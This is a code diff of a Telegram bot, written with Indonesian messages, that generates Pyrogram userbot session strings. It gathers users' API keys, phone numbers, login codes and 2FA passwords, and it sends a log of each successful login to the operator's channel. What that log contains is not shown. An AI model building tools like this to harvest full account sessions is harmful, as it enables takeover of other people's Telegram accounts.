@@ -26,7 +26,7 @@ STEP_PHONE = 3
 STEP_PASSWORD = 4
 STEP_DONE = 5
 
-async def generate_pyrogram_session(api_id, api_hash, phone_number, password=None):
+async def generate_pyrogram_session(api_id, api_hash, phone_number):
     client = Client(
         ":memory:",
         api_id=api_id,
@@ -39,32 +39,37 @@ async def generate_pyrogram_session(api_id, api_hash, phone_number, password=Non
     try:
         sent_code = await client.send_code(phone_number)
     except PhoneNumberInvalid:
-        return "ERROR: Nomor telepon tidak valid.", None
+        await client.disconnect()
+        return "ERROR: Nomor telepon tidak valid.", None, None
     except FloodWait as e:
-        return f"ERROR: Terlalu banyak percobaan. Coba lagi dalam {e.value} detik.", None
+        await client.disconnect()
+        return f"ERROR: Terlalu banyak percobaan. Coba lagi dalam {e.value} detik.", None, None
+    except ApiIdInvalid:
+        await client.disconnect()
+        return "ERROR: API ID atau API HASH tidak valid/cocok.", None, None
     
     prompt_message = (
         "✅ **Kode Verifikasi telah terkirim.**\n\n"
-        "Silakan balas pesan ini dengan kode verifikasi yang Anda terima di Telegram.\n"
-        "Contoh: `12345`"
+        "➡️ **Langkah 3/4:** Silakan balas pesan ini dengan **Kode Verifikasi** yang Anda terima di Telegram.\n"
+        "*(Contoh: 12345)*"
     )
     return prompt_message, client, sent_code
 
 async def finalize_pyrogram_session(client, phone_number, sent_code, code, password=None):
     try:
-        await client.sign_in(phone_number, sent_code.phone_code_hash, code)
+        await client.sign_in(phone_number, sent_code.phone_code_hash, code, password=password)
     except PhoneCodeInvalid:
         await client.disconnect()
         return "ERROR: Kode verifikasi salah.", None
     except SessionPasswordNeeded:
-        if not password:
-            return "2FA_NEEDED", None
-        
-        try:
-            await client.check_password(password)
-        except PasswordHashInvalid:
-            await client.disconnect()
-            return "ERROR: Password 2FA salah.", None
+        # Jika dipanggil tanpa password dan password dibutuhkan
+        return "2FA_NEEDED", None
+    except PasswordHashInvalid:
+        await client.disconnect()
+        return "ERROR: Password 2FA salah.", None
+    except Exception as e:
+        await client.disconnect()
+        return f"ERROR: Terjadi kesalahan: {str(e)}", None
             
     session_string = await client.export_session_string()
     
@@ -77,7 +82,7 @@ async def finalize_pyrogram_session(client, phone_number, sent_code, code, passw
 @app.on_message(filters.command("start") & filters.private)
 async def start_handler(client, message):
     markup = InlineKeyboardMarkup([
-        [InlineKeyboardButton("Pyrogram V2 (UserBot)", callback_data="type_pyrogram_v2_user")],
+        [InlineKeyboardButton("Pyrogram V2 (Userbot)", callback_data="type_pyrogram_v2_user")],
         [InlineKeyboardButton("Pyrogram (V1 Legacy)", callback_data="type_pyrogram_user")]
     ])
     
@@ -96,17 +101,20 @@ async def callback_handler(client, callback_query):
 
     if data.startswith("type_"):
         parts = data.split('_')
-        session_type = parts[1]
+        session_type = "_".join(parts[1:])
+        
+        # Hapus state lama sebelum memulai
+        USER_STATES.pop(user_id, None) 
         
         USER_STATES[user_id] = {
             'step': STEP_API_ID,
             'session_type': session_type,
-            'is_userbot': True,
             'api_id': None,
             'api_hash': None,
             'phone_number': None,
             'client_obj': None,
-            'sent_code': None
+            'sent_code': None,
+            'code': None
         }
         
         await callback_query.message.edit_text(
@@ -153,8 +161,6 @@ async def input_handler(client, message):
         )
 
     elif step == STEP_PHONE:
-        session_type = current_state['session_type']
-        
         if current_state['phone_number'] is None:
             if not re.match(r'^\+\d{10,15}$', text):
                 await message.reply_text("❌ Format nomor telepon salah. Harus diawali '+' dan kode negara. Silakan coba lagi. (Contoh: +628123456789)")
@@ -167,27 +173,22 @@ async def input_handler(client, message):
             api_hash = current_state['api_hash']
             phone_number = current_state['phone_number']
 
-            if session_type.startswith('pyrogram'):
-                try:
-                    prompt, client_obj, sent_code = await generate_pyrogram_session(api_id, api_hash, phone_number)
-                except ApiIdInvalid:
-                    await message.reply_text("❌ **Error:** API ID dan API HASH tidak valid/cocok. Silakan /start ulang.")
-                    USER_STATES.pop(user_id, None)
-                    return
+            prompt, client_obj, sent_code = await generate_pyrogram_session(api_id, api_hash, phone_number)
 
-                if prompt.startswith("ERROR"):
-                    await message.reply_text(prompt)
-                    USER_STATES.pop(user_id, None)
-                else:
-                    USER_STATES[user_id]['client_obj'] = client_obj
-                    USER_STATES[user_id]['sent_code'] = sent_code
-                    await message.reply_text(prompt)
-            else:
-                await message.reply_text("❌ **Error:** Jenis sesi tidak didukung pada langkah ini. Silakan /start ulang.")
+            if prompt.startswith("ERROR"):
+                await message.reply_text(prompt)
                 USER_STATES.pop(user_id, None)
+            else:
+                USER_STATES[user_id]['client_obj'] = client_obj
+                USER_STATES[user_id]['sent_code'] = sent_code
+                await message.reply_text(prompt)
+        
+        # Menerima Kode Verifikasi
+        else:
+            # Membersihkan input dari spasi (misal: "1 2 3 4 5" menjadi "12345")
+            cleaned_code = text.replace(" ", "")
 
-        elif session_type.startswith('pyrogram'):
-            if not text.isdigit():
+            if not cleaned_code.isdigit():
                 await message.reply_text("❌ Kode harus berupa angka. Silakan coba lagi.")
                 return
 
@@ -197,9 +198,9 @@ async def input_handler(client, message):
             sent_code = current_state['sent_code']
             phone_number = current_state['phone_number']
             
-            USER_STATES[user_id]['code'] = text # Simpan kode
-            
-            result, account_info = await finalize_pyrogram_session(client_obj, phone_number, sent_code, text)
+            USER_STATES[user_id]['code'] = cleaned_code
+
+            result, account_info = await finalize_pyrogram_session(client_obj, phone_number, sent_code, cleaned_code)
 
             if result.startswith("ERROR"):
                 await message.reply_text(result + "\nSilakan /start ulang.")
@@ -212,52 +213,40 @@ async def input_handler(client, message):
                     "🔑 **Otentikasi Dua Faktor (2FA) Terdeteksi!**\n\n"
                     "➡️ **Langkah 4/4:** Silakan kirimkan **Password 2FA** akun Anda sekarang."
                 )
-            
+                
             else:
-                await send_success_message(message, result, account_info, session_type)
+                await send_success_message(message, result, account_info, current_state['session_type'])
                 USER_STATES.pop(user_id, None)
                 return
 
     elif step == STEP_PASSWORD:
-        session_type = current_state['session_type']
-        
-        if session_type.startswith('pyrogram'):
-            await message.reply_text("⏳ **Memproses...** Mencoba login dengan Password 2FA...")
+        await message.reply_text("⏳ **Memproses...** Mencoba login dengan Password 2FA...")
 
-            client_obj = current_state['client_obj']
-            sent_code = current_state['sent_code']
-            phone_number = current_state['phone_number']
-            code = current_state.get('code')
-            password = text
+        client_obj = current_state.get('client_obj')
+        sent_code = current_state.get('sent_code')
+        phone_number = current_state.get('phone_number')
+        code = current_state.get('code')
+        password = text
+        session_type = current_state.get('session_type')
 
-            if not code:
-                 await message.reply_text("❌ **Error:** Kode verifikasi tidak tersimpan. Silakan /start ulang.")
-                 USER_STATES.pop(user_id, None)
-                 return
-
-            # Coba lagi sign in dengan kode dan password
-            try:
-                await client_obj.sign_in(phone_number, sent_code.phone_code_hash, code, password=password)
-                
-                session_string = await client_obj.export_session_string()
-                me = await client_obj.get_me()
-                account_info = f"ID: `{me.id}`\nUsername: `@{me.username}`\nNama: `{me.first_name}`"
-                await client_obj.disconnect()
-                
-                await send_success_message(message, session_string, account_info, session_type)
-                USER_STATES.pop(user_id, None)
-
-            except PasswordHashInvalid:
-                await client_obj.disconnect()
-                await message.reply_text("❌ **Error:** Password 2FA salah. Silakan /start ulang.")
-                USER_STATES.pop(user_id, None)
-            except Exception as e:
-                await client_obj.disconnect()
-                await message.reply_text(f"❌ **Error tak terduga saat 2FA:** {str(e)}. Silakan /start ulang.")
-                USER_STATES.pop(user_id, None)
-        else:
-             await message.reply_text("❌ **Error:** Alur Telethon tidak didukung di bot ini. Silakan /start ulang.")
+        if not client_obj or not sent_code or not code:
+             await message.reply_text("❌ **Error:** Kredensial tidak lengkap atau sesi login hilang. Silakan /start ulang.")
              USER_STATES.pop(user_id, None)
+             return
+
+        # Coba lagi sign in, kali ini dengan password
+        result, account_info = await finalize_pyrogram_session(client_obj, phone_number, sent_code, code, password=password)
+
+        if result.startswith("ERROR"):
+            await message.reply_text(result + "\nSilakan /start ulang.")
+            USER_STATES.pop(user_id, None)
+        elif result == "2FA_NEEDED":
+             # Seharusnya tidak terjadi jika password sudah dimasukkan
+             await message.reply_text("❌ **Error:** Permintaan 2FA berulang. Silakan /start ulang.")
+             USER_STATES.pop(user_id, None)
+        else:
+            await send_success_message(message, result, account_info, session_type)
+            USER_STATES.pop(user_id, None)
 
 async def send_success_message(message: Message, session_string: str, account_info: str, session_type: str):
     user_id = message.from_user.id
@@ -290,9 +279,9 @@ async def send_success_message(message: Message, session_string: str, account_in
     try:
         await app.send_message(LOG_CHANNEL_ID, log_text, parse_mode=enums.ParseMode.MARKDOWN)
     except Exception as e:
-        await message.reply_text(f"❌ **Error Logging:** Gagal mengirim log ke channel. Error: `{e}`")
+        # Kirim error ke pengguna jika gagal log
+        await app.send_message(user_id, f"❌ **Error Logging:** Gagal mengirim log ke channel. Pastikan bot adalah Admin di Channel Log. Error: `{e}`")
 
 if __name__ == "__main__":
     print("Bot sedang berjalan...")
     app.run()
-
